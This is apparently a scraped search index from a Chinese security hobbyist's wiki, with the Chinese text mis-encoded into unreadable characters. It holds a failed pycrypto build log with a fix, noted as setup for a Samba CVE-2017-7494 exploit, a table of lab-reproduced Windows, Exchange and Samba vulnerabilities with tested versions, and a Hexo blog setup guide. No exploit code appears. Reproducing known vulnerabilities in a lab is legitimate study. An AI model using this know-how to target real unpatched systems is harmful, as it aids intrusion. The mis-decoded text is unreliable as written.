build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_generic.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_nt.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_Counter.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_number.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_asn1.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/test_pkcs1_15.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/test_pkcs1_pss.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature creating build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/AllOrNothing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/Chaffing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/KDF.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol creating build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/ElGamal.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_slowmath.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/pubkey.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey creating build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/PKCS1_v1_5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/PKCS1_PSS.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature running build_ext running build_configure checking for gcc... gcc checking whether the C compiler works... yes checking for C compiler default output file name... a.out checking for suffix of executables... checking whether we are cross compiling... no checking for suffix of object files... o checking whether we are using the GNU C compiler... yes checking whether gcc accepts -g... yes checking for gcc option to accept ISO C89... none needed checking for __gmpz_init in -lgmp... yes checking for __gmpz_init in -lmpir... no checking whether mpz_powm is declared... yes checking whether mpz_powm_sec is declared... yes checking how to run the C preprocessor... gcc -E checking for grep that handles long lines and -e... /usr/bin/grep checking for egrep... /usr/bin/grep -E checking for ANSI C header files... yes checking for sys/types.h... yes checking for sys/stat.h... yes checking for stdlib.h... yes checking for string.h... yes checking for memory.h... yes checking for strings.h... yes checking for inttypes.h... yes checking for stdint.h... yes checking for unistd.h... yes checking for inttypes.h... (cached) yes checking limits.h usability... yes checking limits.h presence... yes checking for limits.h... yes checking stddef.h usability... yes checking stddef.h presence... yes checking for stddef.h... yes checking for stdint.h... (cached) yes checking for stdlib.h... (cached) yes checking for string.h... (cached) yes checking wchar.h usability... yes checking wchar.h presence... yes checking for wchar.h... yes checking for inline... inline checking for int16_t... yes checking for int32_t... yes checking for int64_t... yes checking for int8_t... yes checking for size_t... yes checking for uint16_t... yes checking for uint32_t... yes checking for uint64_t... yes checking for uint8_t... yes checking for stdlib.h... (cached) yes checking for GNU libc compatible malloc... yes checking for memmove... yes checking for memset... yes configure: creating ./config.status config.status: creating src/config.h building &#x27;Crypto.PublicKey._fastmath&#x27; extension creating build/temp.linux-x86_64-2.7 creating build/temp.linux-x86_64-2.7/src x86_64-linux-gnu-gcc -pthread -fno-strict-aliasing -Wdate-time -D_FORTIFY_SOURCE=2 -ffile-prefix-map=/build/python2.7-8IS1Qc/python2.7-2.7.18=. -fstack-protector-strong -Wformat -Werror=format-security -fPIC -std=c99 -O3 -fomit-frame-pointer -Isrc/ -I/usr/include/ -I/usr/include/python2.7 -c src/_fastmath.c -o build/temp.linux-x86_64-2.7/src/_fastmath.o src/_fastmath.c:31:10: fatal error: Python.h: No such file or directory 31 | #include &quot;Python.h&quot; | ^~~~~~~~~~ compilation terminated. error: command &#x27;x86_64-linux-gnu-gcc&#x27; failed with exit status 1 ---------------------------------------- ERROR: Failed building wheel for pycrypto Running setup.py clean for pycrypto Building wheel for impacket (setup.py) ... done Created wheel for impacket: filename=impacket-0.9.16.dev0-py2-none-any.whl size=1263708 sha256=d158770b6ad3a879d737cbe52ef4f12e649acde7168dd5eab20f6f05aa7e4591 Stored in directory: /tmp/pip-ephem-wheel-cache-4l6X3Z/wheels/3f/bd/9d/20149bb82f419124e5c1ac5af149153f15508adf611abc9e26Successfully built impacketFailed to build pycryptoInstalling collected packages: pycrypto, pyasn1, impacket Running setup.py install for pycrypto ... error ERROR: Command errored out with exit status 1: command: /usr/bin/python2 -u -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\\r &#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27; &#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; install --record /tmp/pip-record-wHqAzo/install-record.txt --single-version-externally-managed --compile --install-headers /usr/local/include/python2.7/pycrypto cwd: /tmp/pip-install-lukwux/pycrypto/ Complete output (156 lines): running install running build running build_py creating build creating build/lib.linux-x86_64-2.7 creating build/lib.linux-x86_64-2.7/Crypto copying lib/Crypto/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto copying lib/Crypto/pct_warnings.py -&gt; build/lib.linux-x86_64-2.7/Crypto creating build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA384.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA512.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/RIPEMD.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/MD2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/HMAC.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/hashalgo.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash copying lib/Crypto/Hash/SHA224.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Hash creating build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/blockalgo.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/ARC2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/CAST.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/DES3.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/PKCS1_OAEP.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/PKCS1_v1_5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/DES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/XOR.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/AES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/ARC4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher copying lib/Crypto/Cipher/Blowfish.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Cipher creating build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/randpool.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/asn1.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/Counter.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/py21compat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/RFC1751.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/number.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/_number_new.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util copying lib/Crypto/Util/py3compat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Util creating build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/_UserFriendlyRNG.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random copying lib/Crypto/Random/random.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random creating build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/SHAd256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/FortunaGenerator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna copying lib/Crypto/Random/Fortuna/FortunaAccumulator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/Fortuna creating build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/posix.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/fallback.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/rng_base.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG copying lib/Crypto/Random/OSRNG/nt.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Random/OSRNG creating build/lib.linux-x86_64-2.7/Crypto/SelfTest copying lib/Crypto/SelfTest/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest copying lib/Crypto/SelfTest/st_common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_ARC2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_AES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_ARC4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_XOR.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_Blowfish.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_CAST.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_pkcs1_15.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_pkcs1_oaep.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_DES.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher copying lib/Crypto/SelfTest/Cipher/test_DES3.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Cipher creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD4.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA512.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA224.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD2.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_HMAC.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA384.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/common.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_RIPEMD.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_SHA256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash copying lib/Crypto/SelfTest/Hash/test_MD5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Hash creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_chaffing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_KDF.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_rfc1751.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol copying lib/Crypto/SelfTest/Protocol/test_AllOrNothing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Protocol creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_ElGamal.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey copying lib/Crypto/SelfTest/PublicKey/test_importKey.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/PublicKey creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/test_rpoolcompat.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random copying lib/Crypto/SelfTest/Random/test_random.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_FortunaAccumulator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_FortunaGenerator.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna copying lib/Crypto/SelfTest/Random/Fortuna/test_SHAd256.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/Fortuna creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_fallback.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_posix.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_generic.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG copying lib/Crypto/SelfTest/Random/OSRNG/test_nt.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Random/OSRNG creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_Counter.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_number.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_winrandom.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util copying lib/Crypto/SelfTest/Util/test_asn1.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Util creating build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/test_pkcs1_15.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature copying lib/Crypto/SelfTest/Signature/test_pkcs1_pss.py -&gt; build/lib.linux-x86_64-2.7/Crypto/SelfTest/Signature creating build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/AllOrNothing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/Chaffing.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol copying lib/Crypto/Protocol/KDF.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Protocol creating build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/ElGamal.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_DSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_RSA.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/_slowmath.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey copying lib/Crypto/PublicKey/pubkey.py -&gt; build/lib.linux-x86_64-2.7/Crypto/PublicKey creating build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/__init__.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/PKCS1_v1_5.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature copying lib/Crypto/Signature/PKCS1_PSS.py -&gt; build/lib.linux-x86_64-2.7/Crypto/Signature running build_ext running build_configure building &#x27;Crypto.PublicKey._fastmath&#x27; extension creating build/temp.linux-x86_64-2.7 creating build/temp.linux-x86_64-2.7/src x86_64-linux-gnu-gcc -pthread -fno-strict-aliasing -Wdate-time -D_FORTIFY_SOURCE=2 -ffile-prefix-map=/build/python2.7-8IS1Qc/python2.7-2.7.18=. -fstack-protector-strong -Wformat -Werror=format-security -fPIC -std=c99 -O3 -fomit-frame-pointer -Isrc/ -I/usr/include/ -I/usr/include/python2.7 -c src/_fastmath.c -o build/temp.linux-x86_64-2.7/src/_fastmath.o src/_fastmath.c:31:10: fatal error: Python.h: No such file or directory 31 | #include &quot;Python.h&quot; | ^~~~~~~~~~ compilation terminated. error: command &#x27;x86_64-linux-gnu-gcc&#x27; failed with exit status 1 ---------------------------------------- ERROR: Command errored out with exit status 1: /usr/bin/python2 -u -c &#x27;import sys, setuptools, tokenize; sys.argv[0] = &#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;; __file__=&#x27;&quot;&#x27;&quot;&#x27;/tmp/pip-install-lukwux/pycrypto/setup.py&#x27;&quot;&#x27;&quot;&#x27;;f=getattr(tokenize, &#x27;&quot;&#x27;&quot;&#x27;open&#x27;&quot;&#x27;&quot;&#x27;, open)(__file__);code=f.read().replace(&#x27;&quot;&#x27;&quot;&#x27;\\r &#x27;&quot;&#x27;&quot;&#x27;, &#x27;&quot;&#x27;&quot;&#x27; &#x27;&quot;&#x27;&quot;&#x27;);f.close();exec(compile(code, __file__, &#x27;&quot;&#x27;&quot;&#x27;exec&#x27;&quot;&#x27;&quot;&#x27;))&#x27; install --record /tmp/pip-record-wHqAzo/install-record.txt --single-version-externally-managed --compile --install-headers /usr/local/include/python2.7/pycrypto Check the logs for full command output. ä»é”™è¯¯ä¿¡æ¯æ¥çœ‹ï¼Œé—®é¢˜å‡ºç°åœ¨å°è¯•å®‰è£…pycryptoåº“æ—¶ã€‚é”™è¯¯çš„å…³é”®åœ¨äºç¼ºå°‘Pythonå¼€å‘å¤´æ–‡ä»¶ï¼ˆPython.hï¼‰ï¼Œè¿™é€šå¸¸æ˜¯å› ä¸ºæ²¡æœ‰å®‰è£…Pythonçš„å¼€å‘åŒ…ã€‚åœ¨Linuxç³»ç»Ÿä¸­ï¼Œç‰¹åˆ«æ˜¯åƒKaliè¿™æ ·çš„åŸºäºDebiançš„ç³»ç»Ÿï¼Œæ‚¨å¯ä»¥å®‰è£…Pythonå¼€å‘åŒ…ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ å®‰è£…Python 2å¼€å‘åŒ…ï¼š è¿™ä¸ªåŒ…åŒ…å«äº†ç¼–è¯‘ä¸€äº›Pythonæ‰©å±•æ‰€éœ€çš„å¤´æ–‡ä»¶å’Œåº“ã€‚åœ¨ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥å®‰è£… 1sudo apt-get install python2-dev é‡æ–°å°è¯•å®‰è£…pycrypto 1sudo python2 -m pip install -r requirements.txt å‚è€ƒé“¾æ¥ å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ Samba è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-7494ï¼‰ å¯åŠ¨ç¯å¢ƒå’Œexpæ‰§è¡Œå‘½ä»¤å‚è€ƒ exploit-CVE-2017-7494 expï¼Œæ˜¯python2ï¼Œéœ€è¦å®‰è£…ç›¸å…³ä¾èµ–"},{"title":"ç›®å½•","path":"/wiki/vuln_reproduction/ç›®å½•_æ¼æ´å¤ç°.html","content":"RCE windows åç§°/ç¼–å· ç›®æ ‡ç³»ç»Ÿ/ç»„ä»¶/ç¨‹åº å½±å“èŒƒå›´ å·²å¤ç°ç‰ˆæœ¬ æµ‹ä¸é€šçš„ç‰ˆæœ¬ PrintNightmare æ‰“å°æœºğŸ–¨ç¨‹åº Windows 7Windows 8.1Windows 10Windows Server 2008 R2Windows Server 2012Windows Server 2016Windows Server 2019 server2019ä½œä¸ºDCåŸŸé‡Œç”¨æˆ·win7ï¼Œserver2016ï¼Œwin10å‡å¤ç° server2012ä½œä¸ºDCèƒ½å¤ç°åŠ è½½æœ¬åœ°çš„dllï¼ŒSMBä¼šrpc_s_access_denied ExchangeCVE-2021-26858/CVE-2021-27065 Exchange CVE-2021-27065/CVE-2021-26855/CVE-2021-26858ï¼šExchange Server 2019 Cumulative Update 8Exchange Server 2019 Cumulative Update 7Exchange Server 2016 Cumulative Update 19Exchange Server 2016 Cumulative Update 18Exchange Server 2013 Cumulative Update 23 Exchange Server 2016 Cumulative Update 18 Exchange Server 2019 Cumulative Update 9 Exchange ProxyShell Exchange Exchange Server 2010Exchange Server 2013Exchange Server 2016Exchange Server 2019 Exchange 2016 cu18Exchange 2019 cu9(?) Linux åç§°/ç¼–å· ç›®æ ‡ç³»ç»Ÿ/ç»„ä»¶/ç¨‹åº å½±å“èŒƒå›´ å·²å¤ç°ç‰ˆæœ¬ æµ‹ä¸é€šçš„ç‰ˆæœ¬ Samba CVE-2017-7494 Samba 4.6.3(vulhubçš„)"},{"title":"Stellaræ­å»ºå’Œéƒ¨ç½²","path":"/wiki/stellar/Stellaræ­å»ºå’Œéƒ¨ç½².html","content":"è¿™ç¯‡æ–‡ç« ä»‹ç»å¦‚ä½•åœ¨Hexoç¯å¢ƒä¸‹ä½¿ç”¨Stellarä¸»é¢˜è¿›è¡Œç½‘ç«™æ­å»ºï¼ŒåŒ…æ‹¬é…ç½®æ­¥éª¤å’Œéƒ¨ç½²åˆ°é™æ€ç½‘é¡µçš„æ–¹æ³•ã€‚ å®‰è£…Hexo å®‰è£…gitï¼Œæ£€æŸ¥gitæ˜¯å¦å®‰è£…æˆåŠŸ 1git --version å®‰è£…Node.jsï¼Œæ£€æµ‹nodejså’Œnpmæ˜¯å¦å®‰è£…æˆåŠŸ 1node -v 1npm -v å…¨å±€å®‰è£…Hexo 1npm install -g hexo-cli Hexoåˆå§‹åŒ–å¹¶ä½¿ç”¨stellarä¸»é¢˜ åˆ›å»ºä»Šåæ”¾ç½®åšå®¢çš„æ–‡ä»¶å¤¹ï¼Œcmd cmd123cd /d E:\\mkdir _MyStellarBlog_v1.25.0cd _MyStellarBlog_v1.25.0 å³é”®Git Bash here åšå®¢æ ¹ç›®å½•1hexo init #åˆå§‹åŒ–åšå®¢ å›æ˜¾12345INFO Cloning hexo-starter https://github.com/hexojs/hexo-starter.gitINFO Install dependencies&#x27;npm&#x27; is not recognized as an internal or external command,operable program or batch file.WARN Failed to install dependencies. Please run &#x27;npm install&#x27; in &quot;E:\\_MyStellarBlog_v1.25.0&quot; folder. 1npm install è¿™æ­¥å¯èƒ½æœ‰æŠ¥é”™ å°è¯•åœ¨æœ¬åœ°é¢„è§ˆ 1hexo clean &amp;&amp; hexo s å¯èƒ½ä¼šå‡ºç°çš„å›æ˜¾123ERROR Cannot find module &#x27;hexo&#x27; from &#x27;E:\\_MyStellarBlog_v1.25.0&#x27;ERROR Local hexo loading failed in E:\\_MyStellarBlog_v1.25.0ERROR Try running: &#x27;rm -rf node_modules &amp;&amp; npm install --force&#x27; åœ¨git bashæ‰§è¡Œ 1rm -rf node_modules &amp;&amp; npm install --force å†å°è¯•åœ¨æœ¬åœ°é¢„è§ˆ 1hexo s 